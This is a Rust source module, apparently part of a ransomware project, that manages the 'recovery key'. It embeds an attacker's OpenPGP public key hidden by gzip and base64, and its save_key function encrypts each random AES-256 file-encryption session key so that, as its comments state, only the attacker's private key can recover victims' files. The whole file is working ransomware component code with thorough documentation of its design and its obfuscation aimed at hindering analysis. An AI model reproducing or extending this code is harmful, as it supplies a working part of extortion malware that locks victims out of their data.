//! # Recovery Key Management Module
//!
//! This module implements OpenPGP-based session key protection, ensuring that only
//! the attacker (holding the private key) can decrypt the randomly generated
//! AES-256 session key used for file encryption.
//!
//! ## Hybrid Encryption Architecture
//!
//! The ransomware uses a hybrid encryption scheme:
//! 1. **Symmetric (AES-256)**: Fast bulk file encryption with randomly generated session key
//! 2. **Asymmetric (OpenPGP)**: Protects the session key - only private key holder can decrypt
//!    - Supports RSA and elliptic curve keys (Ed25519, Cv25519)
//!    - Uses `sequoia-openpgp` for modern OpenPGP implementation
//!
//! ## OpenPGP Public Key Obfuscation
//!
//! The attacker's public key is embedded in the binary using multi-layer obfuscation:
//! - **Gzip Compression**: Reduces key size and obfuscates structure
//! - **Base64 Encoding**: Makes binary representation printable/embeddable as string
//! - **Const String**: Embedded at compile time in `PUB_KEY_ENCODED`
//!
//! This makes static analysis and key extraction more difficult.
//! Supports both RSA and elliptic curve OpenPGP keys (Ed25519, Cv25519).
//!
//! ## Recovery File Format
//!
//! Recovery files (`~/.local/share/recovery_file_{index}.key` on Linux) contain:
//! - OpenPGP-encrypted session key (SEIPD v1 format)
//! - Encrypted using attacker's public key (RSA or elliptic curve)
//! - Can only be decrypted with attacker's private key
//! - Uses AES-256 as symmetric algorithm for the OpenPGP message layer
//! - Multiple recovery files support multi-session encryption (progressive key indices)
//!
//! ## Security Properties
//!
//! - **No Key Escrow**: Session key never stored in plaintext
//! - **Forward Secrecy**: Each ransomware execution generates a new session key
//! - **Public Key Crypto**: Victim cannot decrypt files without attacker's private key

use base64::{engine::general_purpose, Engine as _};
use dirs2::data_dir;
use flate2::read::GzDecoder;
use sequoia_openpgp::{
    cert::prelude::*,
    crypto::SymmetricAlgorithm::AES256,
    policy::StandardPolicy,
    serialize::stream::{Encryptor, LiteralWriter, Message},
};
use std::{
    fs::File,
    io::{Error, Read, Result, Write},
    str::FromStr,
};

/// Embedded OpenPGP public key (Gzip + Base64 encoded).
///
/// This is the attacker's public key embedded at compile time. It is:
/// - **Gzip-compressed** to reduce size and obfuscate structure
/// - **Base64-encoded** to allow embedding as a Rust string literal
/// - **Used to encrypt** the random AES-256 session key
/// - **Supports** both RSA and elliptic curve keys (Ed25519, Cv25519)
///
/// Decoding process: Base64 decode → Gzip decompress → OpenPGP ASCII armor parse
pub const PUB_KEY_ENCODED: &str = r#"H4sIAAAAAAAAA32SS5OiMBSF9/kV7q0u6B5AXMwiCUl4S0TBsOOhUQS07dbQ/vpp51FTM1M1Z3Wrzj2L89V5evoUIsyLJwlLJskahR6eBERMULjAwcN9AqB3IlJujttuFH6gBELQLZfKRpA3cNBfjOdFwZdjakVhcSSnERVVavnD5i2OV7o9mHcgv8hytX3VE704V6xTNbMl7+nwed+q/igDEp/KnL4UKVLFxr9XL+a+Yuuz54x9mY83IH4/XyOngLXr3xo2v4b9c5ecDhyhKMcSGvRASKXNtcqyknlEV8JJN6Y5LsGqDKasrCnsO9M915ipiGJ19JDyGOUnH8M3jJDAUBHsSoKpASGWR/4IP7KAlU2ucQKHyIyVTcQ7NhG0tJNBmzzKPkj6rsfKb0PPMb+I5W5QuwhqSyOASVcwfOEgb6xI2hjewphMx3N/Z0FJ7VtS+4xdNxJeHfkTshf8gMw2GScUcuJy4ttAjK/vOB629kVzDrDK2ovXdWUyzA0y0zKUFpptflQn77OCh4y9gZB8MJG/mIC/ofzLRP3RmZW7gEICD3RbLC+OAPXlXnOZHojjTtu8NdfPLTzPhO+u2iS5z+rXtUAwbPaHoL7r86ifHltFsln15jT1zlMZwKs2K/1FOnCrFzpfgK/7ahGA7zMjsfOfDX4Dmg+aNakCAAA="#;

/// Encrypts and saves the AES-256 session key using OpenPGP public key cryptography.
///
/// This function protects the session key with the attacker's public key, ensuring
/// that only the holder of the corresponding private key can recover the key and
/// decrypt the victim's files.
///
/// Uses `sequoia-openpgp` for modern OpenPGP implementation with support for both
/// RSA and elliptic curve keys (Ed25519, Cv25519).
///
/// # Process
///
/// 1. **Decode Embedded Key**: Base64 decode → Gzip decompress → OpenPGP ASCII armor parse
/// 2. **Filter Valid Keys**: Use `StandardPolicy` to validate algorithms and `for_storage_encryption()` to ensure correct key usage flags
/// 3. **Encrypt Session Key**: Use OpenPGP to encrypt the AES-256 key with SEIPD v1 (Symmetric-Key Encrypted Integrity Protected Data)
/// 4. **Save Recovery File**: Write encrypted key to `~/.local/share/recovery_file_{key_count}.key` (Linux) or equivalent on Windows
///
/// # Arguments
///
/// * `key` - The AES-256 session key to protect (32 bytes)
/// * `key_count` - Session index for progressive recovery key naming
///
/// # Returns
///
/// * `Ok(())` - Recovery file successfully created
/// * `Err(Error)` - Failed to decode public key, encrypt, or write recovery file
///
/// # Errors
///
/// - `Failed to decode public key` - Base64 decoding failed (corrupted `PUB_KEY_ENCODED`)
/// - `Failed to convert decoded public key to string` - Invalid UTF-8 after Base64 decode
/// - `Failed to unzip public key` - Gzip decompression failed
/// - `Failed to read pgp cert from string` - OpenPGP certificate parsing failed
/// - `Failed to build encryptor` - OpenPGP encryption operation setup failed
/// - `Failed to build literal writer` - OpenPGP literal data packet creation failed
/// - `Failed to finalize message` - OpenPGP message finalization failed
/// - `Missing data dir` - Cannot resolve system data directory path (expect() call)
///
/// # Security Notes
///
/// - **Symmetric Algorithm**: Uses AES-256 for OpenPGP message encryption (inner layer)
/// - **Asymmetric Protection**: Outer layer uses RSA or ECC (from OpenPGP key) to protect AES-256 symmetric key
/// - **SEIPD v1**: Provides both encryption and integrity protection for the session key
/// - **StandardPolicy**: Validates cryptographic algorithms and excludes weak/deprecated ones
/// - **Key Usage Validation**: `for_storage_encryption()` ensures only keys with correct KeyFlags are used
/// - **Random Padding**: `OsRng` used for both symmetric and asymmetric operations
///
/// # File Location
///
/// - **Linux**: `~/.local/share/recovery_file_{key_count}.key` (e.g., `recovery_file_0.key`, `recovery_file_1.key`)
/// - **Windows**: `%APPDATA%\recovery_file_{key_count}.key` (typically `C:\Users\<user>\AppData\Roaming\`)
pub fn save_key(key: Vec<u8>, key_count: usize) -> Result<()> {
    // Decode Base64-encoded public key
    let decoded_key = general_purpose::STANDARD
        .decode(PUB_KEY_ENCODED)
        .map_err(|_| Error::other("Failed to decode public key"))?;

    // Convert decoded bytes to UTF-8 string (Gzip format is binary-safe)
    let decoded_key_str = String::from_utf8(decoded_key)
        .map_err(|_| Error::other("Failed to convert decoded public key to string"))?;

    // Decompress Gzip-encoded public key
    let mut gz = GzDecoder::new(decoded_key_str.as_bytes());
    let mut unzipped_key = String::new();
    gz.read_to_string(&mut unzipped_key)
        .map_err(|_| Error::other("Failed to unzip public key"))?;

    // Parse OpenPGP certificate and filter valid encryption keys
    let p = &StandardPolicy::new();
    let cert = Cert::from_str(&unzipped_key)
        .map_err(|_| Error::other("Failed to read pgp cert from string"))?;

    // Filter keys with correct usage flags and policy compliance
    // - with_policy(): Apply StandardPolicy (excludes weak algorithms like MD5, SHA1)
    // - supported(): Only algorithms supported by sequoia-openpgp
    // - alive(): Exclude expired keys
    // - revoked(false): Exclude revoked keys
    // - for_storage_encryption(): Only keys with KeyFlags::STORAGE_ENCRYPTION capability
    let recipients = cert
        .keys()
        .with_policy(p, None)
        .supported()
        .alive()
        .revoked(false)
        .for_storage_encryption();

    // Construct recovery file path (OS-specific data directory)
    let mut data_dir = data_dir().expect("Missing data dir");
    data_dir.push(format!("recovery_file_{key_count}"));
    data_dir.set_extension("key");

    let mut recovery_file = File::create(data_dir)?;

    // Build OpenPGP message with hybrid encryption (AES-256 + public key)
    // - Encryptor::for_recipients(): Encrypts for filtered recipients
    // - symmetric_algo(AES256): Inner symmetric encryption algorithm
    // - LiteralWriter: Wraps data as OpenPGP literal data packet
    let message = Message::new(&mut recovery_file);
    let message = Encryptor::for_recipients(message, recipients)
        .symmetric_algo(AES256)
        .build()
        .map_err(|_| Error::other("Failed to build encryptor"))?;
    let mut message = LiteralWriter::new(message)
        .build()
        .map_err(|_| Error::other("Failed to build literal writer"))?;

    // Write session key and finalize OpenPGP message
    message.write_all(&key)?;
    message
        .finalize()
        .map_err(|_| Error::other("Failed to finalize message"))?;

    Ok(())
}
